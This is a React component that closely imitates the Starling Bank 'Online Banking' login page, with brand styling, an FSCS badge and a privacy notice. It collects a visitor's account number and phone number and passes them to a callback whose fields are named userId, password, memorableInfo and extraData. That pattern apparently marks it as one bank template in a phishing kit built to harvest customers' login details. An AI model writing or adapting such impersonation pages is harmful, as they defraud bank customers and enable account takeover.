"use client";

import { useState } from "react";

interface StarlingProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function StarlingTemplate({
  bankName = "Starling Bank",
  selectedOption = "Direct",
  onSuccessSubmit,
}: StarlingProps) {
  const [accountNumber, setAccountNumber] = useState("");
  const [phoneCode, setPhoneCode] = useState("+44 (GB)");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [rememberAccount, setRememberAccount] = useState(false);
  const [isPaused, setIsPaused] = useState(false);

  // Errors & Loading
  const [errors, setErrors] = useState<{ [key: string]: boolean }>({});
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { [key: string]: boolean } = {};

    if (!accountNumber.trim()) newErrors.accountNumber = true;
    if (!phoneNumber.trim()) newErrors.phoneNumber = true;

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);

    const fullPhone = `${phoneCode} ${phoneNumber.trim()}`;

    onSuccessSubmit({
      userId: `Acc: ${accountNumber.trim()}`,
      password: "N/A (App Push Login)",
      memorableInfo: `Phone: ${fullPhone}`,
      extraData: `Remember: ${rememberAccount ? "Yes" : "No"}`,
    });
  };

  return (
    <div className="relative min-h-[640px] h-full w-full bg-white font-sans text-[#182230] flex flex-col md:flex-row overflow-hidden selection:bg-[#25f0c8] selection:text-black">
      
      {/* ================= LEFT SIDE: ANIMATED PHONE & WAVY BACKGROUND ================= */}
      <div className="relative w-full md:w-[48%] bg-[#2b182d] flex items-center justify-center p-8 overflow-hidden">
        
        {/* Subtle wavy SVG divider on the right edge */}
        <div className="hidden md:block absolute right-0 top-0 bottom-0 w-16 pointer-events-none z-10">
          <svg className="h-full w-full fill-white" viewBox="0 0 100 100" preserveAspectRatio="none">
            <path d="M100,0 C70,30 30,70 100,100 Z" />
          </svg>
        </div>

        {/* The Animated Smartphone Bezel */}
        <div className="relative w-[210px] h-[400px] rounded-[38px] border-[5px] border-slate-100/90 bg-[#161324] shadow-2xl p-4 flex flex-col justify-between overflow-hidden">
          
          {/* Top Notch / Avatar Icon */}
          <div className="flex justify-end">
            <div className="h-6 w-6 rounded-full bg-[#3ae0bb] flex items-center justify-center text-[11px] font-bold text-[#161324] shadow">
              S
            </div>
          </div>

          {/* Central Pulsing Starling Ring Animation */}
          <div className="relative flex flex-col items-center justify-center">
            {/* Pulsing Outer Glow */}
            <div className={`absolute h-28 w-28 rounded-full bg-[#25f0c8]/20 blur-xl ${isPaused ? "" : "animate-pulse"}`}></div>
            
            {/* Middle Glow Ring */}
            <div className={`h-24 w-24 rounded-full border-[6px] border-[#37e2bb] flex items-center justify-center shadow-[0_0_20px_rgba(55,226,187,0.4)] ${isPaused ? "" : "transition-all duration-1000"}`}>
              {/* Inner Pill */}
              <div className="h-3 w-10 rounded-full bg-slate-700/60"></div>
            </div>
          </div>

          {/* Bottom App Push Notification Card */}
          <div className="rounded-xl bg-slate-800/80 backdrop-blur-sm p-2.5 flex items-center justify-between border border-slate-700/50">
            <div className="flex items-center gap-2">
              <div className="h-7 w-7 rounded-lg bg-[#25f0c8] flex items-center justify-center text-xs font-black text-slate-900">
                S
              </div>
              <div>
                <span className="text-[10px] text-slate-300 block font-medium">Online Banking</span>
                <div className="h-1.5 w-12 bg-slate-600 rounded-full mt-1"></div>
              </div>
            </div>
            <span className="text-slate-400 text-xs font-bold">›</span>
          </div>

        </div>

        {/* Pause Animation Button (Bottom Left) */}
        <button
          type="button"
          onClick={() => setIsPaused(!isPaused)}
          className="absolute bottom-4 left-4 text-slate-400 hover:text-white text-xs flex items-center gap-1 opacity-70 hover:opacity-100 transition"
          title="Pause animation"
        >
          {isPaused ? "▶" : "❚❚"}
        </button>
      </div>

      {/* ================= RIGHT SIDE: STARLING LOGIN FORM ================= */}
      <div className="relative w-full md:w-[52%] bg-white p-8 sm:p-12 md:p-14 flex flex-col justify-between overflow-y-auto">
        
        <div>
          {/* Top Brand Logo & FSCS Badge */}
          <div className="flex items-center justify-between mb-8">
            <span className="text-3xl font-extrabold tracking-tight text-[#2b182d] font-sans">
              STARLING
            </span>

            {/* FSCS Badge */}
            <div className="bg-[#531765] text-white px-3 py-1 rounded text-[10px] font-bold tracking-wider text-center shrink-0">
              fscs <br /><span className="text-[8px] font-light">PROTECTED</span>
            </div>
          </div>

          {/* Heading */}
          <div className="mb-8">
            <span className="text-sm text-slate-500 font-medium block mb-1">
              Log in to
            </span>
            <h1 className="text-3xl sm:text-4xl font-extrabold text-[#182230] tracking-tight">
              Online Banking
            </h1>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6 max-w-[420px]">
            
            {/* 1. Account Number */}
            <div>
              <label className="flex items-center gap-1.5 text-sm font-semibold text-slate-800 mb-2">
                <span>Account number</span>
                <span className="text-slate-400 cursor-pointer text-xs" title="Your 8-digit account number">ⓘ</span>
              </label>
              <input
                type="text"
                maxLength={8}
                placeholder="e.g. 12345678"
                value={accountNumber}
                onChange={(e) => {
                  setAccountNumber(e.target.value.replace(/\D/g, ""));
                  if (errors.accountNumber) setErrors({ ...errors, accountNumber: false });
                }}
                className={`w-full rounded-md border p-3 text-sm outline-none transition font-mono ${
                  errors.accountNumber
                    ? "border-red-500 bg-red-50/20"
                    : "border-slate-300 focus:border-[#2b182d] focus:ring-1 focus:ring-[#2b182d]"
                }`}
              />
            </div>

            {/* Remember my account number */}
            <div className="pt-0.5">
              <label className="flex items-center gap-2.5 cursor-pointer text-xs text-slate-600 select-none">
                <input
                  type="checkbox"
                  checked={rememberAccount}
                  onChange={(e) => setRememberAccount(e.target.checked)}
                  className="h-4 w-4 rounded border-slate-300 accent-[#2b182d]"
                />
                <span>Remember my account number</span>
              </label>
            </div>

            {/* 2. Phone Number with Country Code */}
            <div>
              <label className="block text-sm font-semibold text-slate-800 mb-2">
                Phone number
              </label>
              <div className="flex gap-2">
                {/* Dial Code Dropdown */}
                <select
                  value={phoneCode}
                  onChange={(e) => setPhoneCode(e.target.value)}
                  className="rounded-md border border-slate-300 bg-white px-3 py-3 text-xs font-semibold text-slate-700 outline-none focus:border-[#2b182d] cursor-pointer shrink-0"
                >
                  <option value="+44 (GB)">+44 (GB)</option>
                  <option value="+1 (US)">+1 (US)</option>
                  <option value="+353 (IE)">+353 (IE)</option>
                  <option value="+33 (FR)">+33 (FR)</option>
                </select>

                {/* Phone Input */}
                <input
                  type="tel"
                  placeholder="e.g. 7777333444"
                  value={phoneNumber}
                  onChange={(e) => {
                    setPhoneNumber(e.target.value);
                    if (errors.phoneNumber) setErrors({ ...errors, phoneNumber: false });
                  }}
                  className={`w-full rounded-md border p-3 text-sm outline-none transition font-mono ${
                    errors.phoneNumber
                      ? "border-red-500 bg-red-50/20"
                      : "border-slate-300 focus:border-[#2b182d] focus:ring-1 focus:ring-[#2b182d]"
                  }`}
                />
              </div>
            </div>

            {/* Submit Button (Exact Starling Cyan/Teal Pill) */}
            <div className="pt-2">
              <button
                type="submit"
                disabled={loading}
                className="w-full sm:w-auto rounded-full bg-[#35f0c7] hover:bg-[#22dab4] active:scale-[0.99] px-8 py-3 text-sm font-bold text-[#141b2b] shadow-sm transition cursor-pointer"
              >
                {loading ? "Connecting with app..." : "Log in with the Starling app"}
              </button>
            </div>

          </form>
        </div>

        {/* Bottom Privacy Notice Text */}
        <div className="mt-12 pt-6 text-xs text-slate-500 max-w-[420px]">
          To find out more about how Starling Bank uses your personal data please see our{" "}
          <a href="#" className="text-blue-600 underline hover:text-blue-800">
            Privacy Notice
          </a>.
        </div>

      </div>

    </div>
  );
}